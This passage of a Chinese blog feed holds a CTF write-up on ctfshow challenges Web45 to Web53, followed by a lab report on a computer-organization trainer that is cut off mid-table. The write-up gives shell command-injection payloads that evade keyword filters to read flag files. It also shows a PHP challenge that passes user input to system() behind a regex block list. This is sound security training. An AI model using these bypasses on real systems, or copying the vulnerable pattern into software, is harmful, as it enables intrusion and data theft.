title="Web45"></a>Web45</h3><p>这道题过滤了<code> 空格</code>，也就是说%20被ban了，我们可以使用%09也就是制表符替换得到flag。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span>tac<span class="token operator">%</span><span class="token number">09</span>fla<span class="token operator">*</span><span class="token operator">.</span><span class="token class-name">php</span><span class="token operator">||</span><span class="token class-name">ls</span> <span class="token comment">#使用制表符替换空格</span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token class-name type-declaration">tac</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token constant">IFS</span><span class="token punctuation">&#125;</span>la<span class="token operator">*</span><span class="token operator">.</span><span class="token class-name">php</span><span class="token operator">||</span><span class="token class-name">ls</span><span class="token comment">#也可以使用$&#123;IFS&#125; </span><span class="token comment">#在shell中，有一个好用的环境变量$IFS，用于内部字段分隔符</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="Web46"><a href="#Web46" class="headerlink" title="Web46"></a>Web46</h3><p> 这一道题目，过滤了;|cat|flag|空格|数字|$|* ，怎么说呢, 可以继续使用制表符来替换</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span>tac<span class="token operator">%</span><span class="token number">09</span>fla<span class="token operator">?</span><span class="token operator">.</span><span class="token class-name">php</span><span class="token operator">||</span><span class="token class-name">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Web47"><a href="#Web47" class="headerlink" title="Web47"></a>Web47</h3><p> <strong>;|cat|flag| |[0-9]|\$|*|more|less|head|sort|tail</strong> ,这这这，这都是过滤了什么啊？</p><p>上一个题的东西，还是可以接着使用</p><h3 id="Web48"><a href="#Web48" class="headerlink" title="Web48"></a>Web48</h3><p>好家伙，他这是过滤了什么问题啊，后面那些函数我还是不怎么认得,我之后再去学习下**;|cat|flag| |[0-9]|\$|*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|**还是接着用Web46的pyload就行</p><h3 id="Web49"><a href="#Web49" class="headerlink" title="Web49"></a>Web49</h3><p>一个构造4连杀了,我还不是很清楚这个解法肯定不是期望解，去看看官方的题解是什么样子的。</p><h3 id="Web50"><a href="#Web50" class="headerlink" title="Web50"></a>Web50</h3><p>他这一次终于将制表符给过滤了，这样我们之前的构造也无法使用了，我们可以使用带行号读指令nl ，同时nl里面不支持通配符,所以，这里不能以*和?代替flag.php中的内容，这里需要使用shell指令的一个特性，被两个单引号分割时，会被直接略过，是不会被读取的，因为‘被过滤，我们可以通过%27这种形式进行绕过。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span>nl<span class="token operator">&lt;</span>fla<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">27</span>g<span class="token operator">.</span><span class="token class-name">php</span><span class="token operator">||</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Web51"><a href="#Web51" class="headerlink" title="Web51"></a>Web51</h3><p> 所以说上个题目，我这也不是预期解？继续使用nl&lt;fla’’g.php||就能得到flag </p><h3 id="Web52"><a href="#Web52" class="headerlink" title="Web52"></a>Web52</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>依旧没有过滤nl指令,这也导致我可以继续为所欲为……</p><h3 id="Web53"><a href="#Web53" class="headerlink" title="Web53"></a>Web53</h3><p>这个终于步骤多了起来，这次多过滤了一对尖括号，这就没法用上面的那个构造了，不过好消息是**$**被放出来了， <del>不过这道题我们应该是没有写权限的</del>（应该是有写权限的，只不过我一开始没成功，看官方的wp是能够进行更名的）。</p><p>Web54</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成原理</title>
      <link href="/2022/01/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
      <url>/2022/01/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p><strong>1．实验目的</strong></p><ul><li><p>完成算术、逻辑、移位运算实验。</p></li><li><p>熟悉ALU运算控制位的运用。</p></li></ul><p><strong>2．实验设备</strong></p><p>Dais-CMX16+计算机组成原理教学实验系统一台。</p><p><strong>3．实验原理</strong></p><p>实验中所用的运算器数据通路如图 2-4-1 所示。ALU运算器由 CPLD描述。运算器的输出经过2片74LS245三态门与数据总线相连，2个运算寄存器 AX、BX的数据输入端分别由4个74LS574锁存器锁存，锁存器的输入端与数据总线相连，准双向 I/O 输入输出端口用来给出参与运算的数据，经2片74LS245三态门与数据总线相连。</p><center><img src="D:\gitee-blog\source\_posts\计算机组成原理\1.jpg" style="zoom:50%;" /> </center><center><img src="D:\gitee-blog\source\_posts\计算机组成原理\2.jpg" style="zoom:80%;" /> </center>**4.** **实验内容**<p><strong>1. 字算术运算</strong></p><p>(1) 字写操作（置数操作） </p><p>通过“I/O 单元”二进制开关向寄存器AX和BX置数令X2,X1,X0=011，XP,W=11，I/O端设置为1122h,设置o2,o1,o0=011,OP=1，按单拍此时寄存器AX被置为1122h，再将置数端设置为3344h,o2,o1,o0=010,OP=1，按单拍。此时BX被置为3344h</p><p>(2) 字读操作（运算寄存器 AX 和 BX 内容送总线） </p><p>令o2o1o0=000,同时OP=0,关闭写使能,在令X2,X1,X0=001,XP,W=11读取数据总线位置的数据，先后令M=0,S2,S1,S0=000和M=0,S2,S1,S0=111使fun先后显示 AX值与BX值 </p><p>(3) 字算术运算（不带进位加） </p><p>令 M S2 S1 S0（K15 K13~K11=1011），FUN 及总线单元显示 AX＋BX 的结果。 </p><p>令 M S2 S1 S0（K15 K13~K11=1010），FUN 及总线单元显示 AX－BX 的结果。 </p><p><em><strong>*2.*</strong></em> <em><strong>*字节算术运算*</strong></em> </p><p>(1) 偶字节写（置数操作） </p><p>拨动“I/O 输入输出单元”开关向寄存器 ALBL置数X2 X1 X0=011XP,W=10 拨动开关令I/O=XX22h令o2o1o0=011,OP=1，按单拍向寄存器AL写入偶字节22h,o2,o1,o0=010,OP=1,拨动开关令I/O=XX44h按单拍寄存器BL写入44h。</p><p>(2) 偶字节读操作（运算寄存器 AL 和 BL 内容送总线） </p><p>令o2o1o0=000,同时OP=0,关闭写使能,在令X2,X1,X0=001,XP,W=10读取数据总线位置的数据，先后令M=0,S2,S1,S0=000和M=0,S2,S1,S0=111使fun先后显示 AL值与BL值 </p><p>(3) 偶字节减法运算（不带进位加） </p><p>令M,S2,S1,S0(K15 K13~K11=1011),FUN及总线单元显示 AL＋BL的结果。 </p><p>令M,S2,S1,S0(K15 K13~K11=1010),FUN及总线单元显示 AL－BL的结果。 </p><p><strong>示例</strong> <strong>2</strong> <strong>逻辑运算</strong> </p><p><em><strong>*1.*</strong></em> <em><strong>*字逻辑运算*</strong></em> </p><p>(1) 字写操作（置数操作） </p><p>通过“I/O 单元”二进制开关向寄存器AX和BX置数令X2,X1,X0=011，XP,W=11，选定数据来源为I/O单元，I/O端设置为1122h,设置o2,o1,o0=011,OP=1，按单拍此时寄存器AX被置为1122h，再将置数端设置为3344h,o2,o1,o0=010,OP=1，按单拍。此时BX被置为3344h</p><p>(2) 字读操作（运算寄存器 AX 和 BX 内容送总线） </p><p>令o2o1o0=000,同时OP=0,关闭写使能,在令X2,X1,X0=001,XP,W=11读取数据总线位置的数据，先后令M=0,S2,S1,S0=000和M=0,S2,S1,S0=111使fun先后显示 AX值与BX值 若运算控制位设为（M S2 S1 S0=0000）则F=AL，即AL内容送到数据总线。若运算控制位设为(M S2S1S0=0111)则F=BL,即BL内容送到数据总线。</p><p>(3) 字逻辑运算 </p><p>令M,S2,S1,S0(K15 K13~K11=0010),为逻辑与,FUN及总线显示AX逻辑与BX的结果。</p><p>令M,S2,S1,S0(K15 K13~K11=0011),为逻辑或,FUN及总线显示AX逻辑或BX的结果。</p><p><em><strong>*2.*</strong></em> <em><strong>*字节逻辑运算*</strong></em> </p><p>(1) 偶字节写操作（置数操作） </p><p>拨动“I/O 输入输出单元”开关向寄存器 AL 和 BL 置数，令X2,X1,X0=011,XPW=10 选定数据来源为I/O设备置数为XX22h,拨动开关使o2 o1 o0=011 OP=1，按单拍寄存器AL 为22h，再次置数 使得I/O=XX44h,令o2,o1,o0=010 OP=1，按单拍,此时寄存器BL为44h </p><p>(2) 偶字节读操作（运算寄存器 AL 和 BL 内容送数据总线） </p><p>o2,o1,o0=000 OP=0关闭写使能 X2,X1,X0=001 XP W=10分别令M=0 S2 S1 S0=000 与M=0,S2,S1,S0=111使得数据总线分别显示AL,BL。</p><p>① 若运算控制位设为（M S2 S1 S0=0000）则 F=AL，即 AL 内容送到数据总线。 </p><p>② 若运算控制位设为（M S2 S1 S0=0111）则 F=BL，即 BL 内容送到数据总线。 </p><p>(3) 偶字节逻辑运算 </p><p>令 M S2 S1 S0（K15 K13~K11=0010），为逻辑与，FUN 及总线显示 AL 逻辑与 BL 的结果。 </p><p>令 M S2 S1 S0（K15 K13~K11=0011），为逻辑或，FUN 及总线显示 AL 逻辑或 BL 的结果。 </p><p>(4) 奇字写操作（置数操作） </p><p>拨动“I/O 输入输出单元”开关向寄存器AH和BH置数，操作步骤如下:X2 X1 X0=011 XP W=10选定数据来源为I/O设备置数I/O=XX55h,随后令o2,o1,o0=011 OP=0,按单拍寄存器AH此时的数据为55h再次对I/O单元置数,I/O=XX66h令o2o1o0=010,OP=0,按单拍寄存器BH写入数据66h。</p><p>(5) 奇字节读操作（运算寄存器 AH 和 BH 内容送总线） </p><p>关闭 AH、BH 写使能，令 K17=K18=1，按下流程分别读 AH、BH。 </p><p>o2,o1,o0=000 OP=0关闭写使能 X2,X1,X0=001 XP W=00分别令M=0 S2 S1 S0=000 与M=0,S2,S1,S0=111使得数据总线分别显示AH,BH。</p><p>① 若运算控制位设为（M S2 S1 S0=0000）则 F=AH，即 AH 内容送到数据总线。 </p><p>② 若运算控制位设为（M S2 S1 S0=0111）则 F=BH，即 BH 内容送到数据总线。 </p><p>(6) 奇字节逻辑运算 </p><p>令M,S2,S1,S0(K15 K13~K11=0010),为逻辑与，FUN及总线显示AH逻辑与BH的结果。 </p><p>令M,S2,S1,S0(K15 K13~K11=0011),为逻辑或，FUN及总线显示AH逻辑或BH的结果。</p><p><strong>5．实验心得</strong></p><p>作为验证型实验根据实验指导手册做很简单，但是我们学习不能仅仅只停到这一步，还是要了解实验操作背后的实验原理，明白每一步操作所对应的逻辑功能，比简单的重复完成这一个实验更加重要。</p><h2 id="实验二-通用寄存器实验"><a href="#实验二-通用寄存器实验" class="headerlink" title="实验二  通用寄存器实验"></a>实验二  通用寄存器实验</h2><p><strong>1．实验目的</strong></p><p>（1） 熟悉通用寄存器的数据通路。</p><p>（2）掌握通用寄存器的构成和运用。</p><p><strong>2．实验设备</strong></p><p>Dais-CMX16+计算机组成原理教学实验系统一台。</p><p><strong>3．实验要求</strong></p><p>在掌握了AX、BX运算寄存器的读写操作后，继续完成CX、DX通用寄存器的数据写入与读出。</p><p><strong>4.</strong> <strong>实验原理</strong></p><table><thead><tr><th>目标使能</th><th>通用寄存器目标编址</th><th>功能说明</th><th></th><th></th><th></th></tr></thead><tbody><tr><td>K19~K17</td><td>IR</td><td>K16</td><td>K6</td><td>T4</td><td></td></tr><tr><td>o2~o0</td><td>IR1</td><td>OP</td><td>W</td><td></td><td></td></tr><tr><td>111</td><td>0</td><td>1</td><td>1</td><td>↑</td><td>CX字写</td></tr><tr><td>0</td><td>1</td><td>0</td><td>↑</td><td>CL偶字节写(R0)</td><td></td></tr><tr><td>0</td><td>0</td><td>X</td><td>↑</td><td>CH奇字节写(R1)</td><td></td></tr><tr><td>1</td><td>1</td><td>1</td><td>↑</td><td>DX字写</td><td></td></tr><tr><td>1</td><td>1</td><td>0</td><td>↑</td><td>DL偶字节写(R2)</td><td></td></tr><tr><td>1</td><td>0</td><td>X</td><td>↑</td><td>DH奇字节写(R2)</td><td></td></tr></tbody></table><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml\wpsA046.tmp.jpg" alt="img"> </p><p><strong>5****．实验内容</strong></p><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml\wpsA047.tmp.jpg" alt="img"> </p><p>(1)寄存器组的字写入:</p><p>通过“I/O 单元”把CX的地址00打入IR，然后向CX写入2211h,操作步骤如下:令X2 X1 X0=011 XP W=11选定数据来源为I/O单元,令I/O=XX00h写入数据，令IR=XX00h,MWR IR=11 OP=1,按单拍之后将MWR,IR置为0,0防止数据再次写入，再将置数据I/O=2211h o2 o1 o0=111 OP=1，按单拍此时CX的数据为=2211h</p><p>通过I/O单元把DX的地址02打入IR然后向DX写入4433h,操作步骤如下:X2,X1,X0=011同时XP W=11选的数据来源为I/O单元 拨动I/O单元使得I/O=XX02h,再令MWR,IR=11OP=1,按单拍此时IR=XX02h,此时DX的地址02打入IR,在令MWR,IR=00,令I/O=4433h,o2o1o0=111 OP=1,按单拍将数据写入DX,此时DX的数据为DX=4433h </p><p>(2) 寄存器组的字节写入:</p><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml\wpsA048.tmp.jpg" alt="img"> </p><p>通过I/O单元把CX的地址00打入IR，然后向CH写入55h操作步骤如下:令X2,X1,X0=011同时XP W=11选的数据来源为I/O单元，拨动I/O单元使得I/O=XX02h，拨动开关使MWR IR=11,OP=1，按单拍把CX的地址00打入IR,在令MWR，IR=00防止地址再次写入，令W=0将I/O区域的值置为XX55h,同时令o2 o1 o0=111,OP=0，按单拍将55h写入CH。</p><p>在IR保持为xx00的条件下,可省略打地址环节.按下流程向CL写入AAh令X2,X1,X0=011同时XP W=10选定数据来源为I/O单元，拨动I/O单元开关使得I/O=XXAAh,拨动开关将o2,o1, o0置为111同时OP=0,按单拍将数据55h写入CL,在令o2 o1 o0=000关闭写选通。</p><p>（3）寄存器组字读：</p><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml\wpsA049.tmp.jpg" alt="img"> </p><p>通过I/O 单元把 CX 地址打入IR,然后CX送总线，操作步骤如下：令X2 X1 X0=011,同时XP W=11选定数据来源为I/O单元，拨动I/O单元开关使得I/O=XX00h ,设置MWR IR=11 OP=1，按单拍把CX的地址打入总线MWR IR=00防止后续继续有数据传入令X2 X1 X0=110同时XP W=11 IR端显示来源于CX的数据。</p><p>通过I/O单元把DX地址打入IR，然后DX送总线，操作步骤如下:X2,X1,X0=011同时XP W=11选定数据来源为I/O单元，拨动I/O单元开关使得I/O=XX02h MWR IR=11 OP=1，按单拍再将MWR IR置为0 防止后续继续有数据传入令X2 X1 X0=110 XP W=11此时IR端显示来源于DX的数据</p><p>(4) 寄存器组字节读：</p><p>通过I/O单元把 CX 地址打入 IR，然后按字节方式分别读出 CL、CH。令X2,X1,X0=011同时XP,W=11选定数据来源为I/O单元，拨动I/O单元开关使得I/O=XX00h再将MWR,IR分别置为1,再设置OP=1，按单拍 将CX的地址打入IR,此时IR=XX00h,MWR IR=00 ,令X2 X1 X0=110 ,XP, W=10此时IR的数据来源于CL;在令 X2 X1 X0=110 ,XP W=00此时IR的数据来源于CH。</p><p><strong>6．实验心得</strong></p><p>第二次的计算机组成原理的实验课,实验内容甚至比上次更少，最让人印象深刻的是课件和《计算机组成原理实验指南》上对实验的操作存在错误，这个也更要求我们掌握实验原理能够真正理解实验本质。在完成CX、DX通用寄存器的数据写入与读出的实验操作后，已经能够做到熟悉通用寄存器的数据通路和掌握通用寄存器的构成和运用。</p><p><strong>实验三  存储器****读写实验</strong></p><p><strong>1．实验目的</strong></p><p>熟悉和了解存储器组织与总线组成的数据通路。</p><p><strong>2．实验设备</strong></p><p>Dais-CMX16+计算机组成原理教学实验系统一台。</p><p><strong>3．实验要求</strong></p><p>按照实验步骤完成实验项目，掌握存储部件在原理计算机中的运用。</p><p><strong>4.</strong> <strong>实验原理</strong></p><p>存储器是计算机的存储部件，用于存放程序和数据。存储器是计算机信息存储的核心，是计算机必不可少的部件之一，计算机就是按存放在存储器中的程序自动有序不间断地进行工作。本系统从提高存储器存储信息效率的角度设计数据通路，按现代计算机中最为典型的分段存储理念把存储器组织划分为程序段、数据段等，由此派生了数据总线（DBus）、指令总线（IBus）微总线（μBus）等与现代计算机设计规范相吻合的实验环境。实验所用的存储器电路原理如图 2-4-10 所示，该存储器组织由二片 6116 构成具有奇偶概念的十六位信息存储体系，该存储体系AddBus由IP指针和AR指针分时提供，E/M 控位为“1”时选通IP，反之选通 AR。该存储体系可随机定义总线宽度，动态变更总线结构，把我们的教学实验提高到能与现代计算机设计规范相匹配与接轨的层面。</p><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml\wpsA04F.tmp.jpg" alt="img"> </p><table><thead><tr><th>程序段与数据段源寻址</th><th></th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>源使能</td><td>源编址</td><td>注释</td><td></td><td></td><td></td><td></td></tr><tr><td>X2</td><td>X1</td><td>X0</td><td>E/M</td><td>W</td><td>A0</td><td></td></tr><tr><td>1</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>程序段字读</td></tr><tr><td>0</td><td>0</td><td>程序段偶读</td><td></td><td></td><td></td><td></td></tr><tr><td>X</td><td>1</td><td>程序段奇读</td><td></td><td></td><td></td><td></td></tr><tr><td>1</td><td>1</td><td>0</td><td>数据段字读</td><td></td><td></td><td></td></tr><tr><td>0</td><td>0</td><td>数据段偶读</td><td></td><td></td><td></td><td></td></tr><tr><td>X</td><td>1</td><td>数据段奇读</td><td></td><td></td><td></td><td></td></tr></tbody></table><table><thead><tr><th>程序段与数据段目的寻址</th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>目的编址</td><td>注释</td><td></td><td></td><td></td></tr><tr><td>MWR</td><td>E/M</td><td>W</td><td>A0</td><td></td></tr><tr><td>1</td><td>0</td><td>1</td><td>0</td><td>程序段字写</td></tr><tr><td>0</td><td>0</td><td>程序段偶写</td><td></td><td></td></tr><tr><td>X</td><td>1</td><td>程序段奇写</td><td></td><td></td></tr><tr><td>1</td><td>1</td><td>0</td><td>数据段字写</td><td></td></tr><tr><td>0</td><td>0</td><td>数据段偶写</td><td></td><td></td></tr><tr><td>X</td><td>1</td><td>数据段奇写</td><td></td><td></td></tr></tbody></table><p><strong>5****．实验内容</strong></p><p>\1. 数据段读写操作</p><p>（1） 数据存储器字写</p><p>在进行数据存储器字操作时，地址线A0必须为0（偶地址）。向数据段的0~0005h存储单元写入112233445566一串数据，以0址单元写入数据1122h为例表述操作流程。</p><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml\wpsA05F.tmp.jpg" alt="img"> </p><p>按照上述操作流程完成 0002~0005h单元写入33445566的操作。</p><p>I/0输入地址0000h（DBUS=0000h）将其写入AR，关闭地址写入；I/O输入数据1122h（DBUS=1122h）将其存入地址为0000和0001中，EM显示2211，关闭存储写入。</p><p>I/0输入地址0002h（DBUS=0002h）将其写入AR，关闭地址写入；I/O输入数据3344h（DBUS=3344h）将其存入地址为0002和0003中，EM显示4433，关闭存储写入。</p><p>I/0输入地址0004h（DBUS=0004h）将其写入AR，关闭地址写入；I/O输入数据5566h（DBUS=5566h）将其存入地址为0004和0005中，EM显示6655，关闭存储写入。</p><p>（2） 数据段读操作（字）</p><p>依次读出数据段0~0005h单元的内容，这里以0址单元读出为例阐述操作流程。</p><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml\wpsA060.tmp.jpg" alt="img"> </p><p>执行上述流程总线单元应显示1122h;若正确可按上述流程读出 0002~0005h 单元的内容。</p><p>I/O置地址0000将其写入AR，关闭写入；E/M=1，EM显示地址对应存储内容为2211。读出操作，DBUS显示为1122</p><p>I/O置地址0002将其写入AR，关闭写入；E/M=1，EM显示地址对应存储内容为4433。读出操作，DBUS显示为3344</p><p>I/O置地址0004将其写入AR，关闭写入；E/M=1，EM显示地址对应存储内容为6655。读出操作，DBUS显示为5566</p><p>\2. 存储器程序段读写操作</p><p>（1）程序段字节写操作</p><p>① 计算机规范的取指操作均以字节为单位。所以本实验以字节操作方式展开。程序段写入必须从定义地址入手，然后再进入程序存储器的写入。</p><p>② PC 指针是带预置加法计数器，因此在输入起始地址后一旦后续地址为 PC+1的话就不需重装 PC，用PC+1指令完成下续地址的读写操作。</p><p>③PC地址装载写入与PC+1写入流程</p><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml\wpsA061.tmp.jpg" alt="img"> </p><p>按照上述PC装载写入与PC+1写入的流程分别对0000~0003h写入12345678h。</p><p>I/O置地址为0000，将地址写入PC为0000，关闭地址写入；I/O数据为3412，数据写入EM显示为1212。地址增加为0001，将3434写入EM。</p><p>I/O置地址为0002，将地址写入PC为0002，关闭地址写入；I/O数据为7856，数据写入EM显示为5656。地址增加为0003，将7878写入EM。</p><p>（2）程序段字节读操作</p><p>PC地址装载读出及 PC+1读出流程</p><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml\wpsA062.tmp.jpg" alt="img"> </p><p>按照上述PC装载读出与PC+1读出的流程分别读出0000~0003h单元内容，应为12345678h。</p><p>I/O置地址为0000，将地址写入PC为0000，关闭地址写入；选通存储器打开将数据写入总线，EM显示1212。IP置1，单拍使地址+1，当地址为0001时EM显示3434；IP置1，单拍使地址+1，当地址为0002时EM显示5656；IP置1，单拍使地址+1，当地址为0003时EM显示7878；</p><p><strong>6．实验心得</strong></p><p>\1. EM与I/O内容显示不同：2211h -&gt; 1122h  </p><p>原因：EM显示的内容低位在前。</p><p>\2. 程序段字节读操作: I/O口拨数据7856h，执行上面的方框L：4(XP=1)-&gt;3(IP=0)-&gt;4-&gt;5</p><p>E/M=0，且IP=1时，PC+1</p><p><strong>实验四  中断控制实验</strong></p><p><strong>1．实验目的</strong></p><p>（1） 熟悉中断的硬件机制。</p><p>（2） 了解中断的编程规则。</p><p>（3）掌握中断的控制方法。</p><p><strong>2．实验设备</strong></p><p>Dais-CMX16+计算机组成原理教学实验系统一台。</p><p><strong>3．实验要求</strong></p><p>所谓中断就是指处理机暂时终止执行现行程序而转去处理更加紧迫的事件服务程序，待处理机完毕后再自动返回执行原来的程序过程。</p><p>按图2-4-12所示，本系统提供了一个单级中断硬件机制，由中断请求源INT、中断允许标志IEQ和中断响应标志IAQ组成。</p><p>微程序控制器每执行一条机器指令之后，先查询中断允许标志IEQ，如果IEQ为0，则继续执行下一条机器指令，若检测到IEQ为1，则强制转入微程序控制器的0003h号单元执行中断响应微服务。期间程序首先置位中断响应标志IAQ，其次执行当前PC的进栈操作，然后按照机器程序的要求随机定义中断向量，把中断服务程序入口地址装入程序计数器PC中，转入中断服务子程序的执行。</p><p>遇RET指令，执行中断服务返回微操作，清除中断服务响应标志IAQ，把栈顶所指单元的内容装入程序计数器PC中，恢复执行被中断的机器程序。</p><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml\wpsA068.tmp.jpg" alt="img"> </p><p><strong>4.</strong> <strong>实验原理</strong></p><table><thead><tr><th>K16</th><th>K6</th><th>K3</th><th>按钮</th><th>节拍</th><th>功能</th><th>说明</th></tr></thead><tbody><tr><td>Op</td><td>W</td><td>Ie</td><td>INT</td><td>T4</td><td></td><td></td></tr><tr><td>0</td><td>0</td><td>1</td><td>0</td><td>↑</td><td>1→IEQ</td><td>锁存中断请求</td></tr><tr><td>0</td><td>1</td><td>1</td><td>X</td><td>↑</td><td>0→IEQ</td><td>清除中断请求</td></tr></tbody></table><table><thead><tr><th>K7</th><th>K6</th><th>K3</th><th>K0</th><th>节拍</th><th>功能</th><th>说明</th></tr></thead><tbody><tr><td>Op</td><td>W</td><td>Ie</td><td>Ids</td><td>T4</td><td></td><td></td></tr><tr><td>1</td><td>0</td><td>1</td><td>0</td><td>↑</td><td>1→IAQ</td><td>中断响应</td></tr><tr><td>1</td><td>1</td><td>1</td><td>0</td><td>↑</td><td>0→IAQ</td><td>中断退出</td></tr></tbody></table><p><strong>5．实验****内容</strong></p><p>中断允许控制</p><p>用一双头实验导线将中断请求源输入插孔XINT与中断源产生插孔INT相连接。</p><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml\wpsA069.tmp.png" alt="img"></p><p>将K23~K0全部置为0，关闭控制位，将OP,W,IE三个开关置为001，按住中断按钮将INT置为0，按单拍，打入一个上升沿，此时D触发器D=1;CP为上升沿，又D触发器的现态1变为0。Q`=0，此时指示灯IEQ亮起，在令OP,W,IE=011,打入一个上升沿,此D触发器D=1,CP为上升沿，D触发器的现态有0变为1，Q’=1，指示灯两端电压相等，指示灯不会亮起此时IEQ灯灭。</p><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml\wpsA06A.tmp.png" alt="img"></p><p>将K23~K0全部置为0，关闭控制位，将OP,W,IE三个开关置为101，按单拍IEQ灯亮起，随后将OP,W,IE三个开关置为111，按单拍打入一个上升沿，IAQ灯灭。</p><p><strong>6****．实验心得</strong></p><p>中断控制方式就是实时控制、故障自动处理。它的基本过程是计算机运行过程中，出现某些意外情况需主机干预时，机器能自动停止正在运行的程序并转入处理新情况的程序，处理完毕后又返回原被暂停的程序继续运行。</p><p>时隔半个月在上计算机组成原理的实验课，这次的实验课内容格外的少，也更有时间去思考每一步操作所对应的电路原理，对电路上的触发器的复习，使我对这个实验的认识更加的深刻。</p><p><strong>实验****五</strong>  <strong>基本模型机的设计与实现</strong></p><p><strong>1．实验目的</strong></p><p>（1） 在掌握部件单元电路实验的基础上，构造一台基本模型计算机。</p><p>（2） 为其定义5条机器指令，并编写相应的微程序，上机调试掌握整机概念。</p><p><strong>2．实验设备</strong></p><p>Dais-CMX16+计算机组成原理教学实验系统一台；</p><p>计算机一台。</p><p><strong>3．实验****原理</strong></p><p>手动控制实验过程中，各部件单元的控制信号是以人为模拟产生为主，而本次实验将能在微程序控制下自动产生各部件单元的控制信号，实现特定指令的功能。</p><p>计算机数据通路的控制将由微程序控制器来完成，CPU从EM主存中取出一条机器指令到指令执行结束的一个指令周期全部由微指令组成的序列来完成，即一条机器指令对应一个微程序。</p><p><strong>4. 指令格式</strong></p><p>1.指令格式</p><table><thead><tr><th>7 6 5</th><th>4</th><th>3 2</th><th>1 0</th></tr></thead><tbody><tr><td>OP-CODE</td><td>0</td><td>Rs</td><td>Rd</td></tr><tr><td>Addr</td><td></td><td></td><td></td></tr></tbody></table><p>其中OP-CODE为操作码段，位于指令字节高三位（IR7~IR5）；第四位IR4是保留位，指定为零；低四位为源与目的寄存器地址，它们的编码见下表；Addr定义操作数或操作地址。</p><table><thead><tr><th>Rs或Rd</th><th>选定的寄存器</th></tr></thead><tbody><tr><td>00011011</td><td>R0R1R2R3</td></tr></tbody></table><p>2.指令系统</p><table><thead><tr><th>助记符</th><th>机器指令码</th><th>说明</th></tr></thead><tbody><tr><td>IN R0,IOL</td><td>00100000</td><td>i/o(数据开关)偶字节→r0</td></tr><tr><td>ADD R0,[addr]</td><td>01000000 XXXXXXXX XXXXXXXX</td><td>R0+[addr]→R0</td></tr><tr><td>STA [addr],R0</td><td>01100000 XXXXXXXX XXXXXXXX</td><td>R0→[addr]</td></tr><tr><td>OUT [addr],IOH</td><td>10000000 XXXXXXXX XXXXXXXX</td><td>RAM→i/o(奇字节)</td></tr><tr><td>JMP addr</td><td>10100000 XXXXXXXX XXXXXXXX</td><td>addr→PC</td></tr></tbody></table><p>实验所用的机器指令程序</p><table><thead><tr><th>地址</th><th>指令代码</th><th>助记符</th><th>功能</th></tr></thead><tbody><tr><td>000</td><td>20</td><td>in r0,ioL</td><td>IOL(数据开关)偶字节→R0</td></tr><tr><td>001</td><td>40 00</td><td>add r0,[RAM]</td><td>R0+RAM→R0</td></tr><tr><td>003</td><td>70</td><td>RRC r0</td><td>R0带进位右移→R0</td></tr><tr><td>004</td><td>10</td><td>rl r0</td><td>R0左移→R0</td></tr><tr><td>005</td><td>60 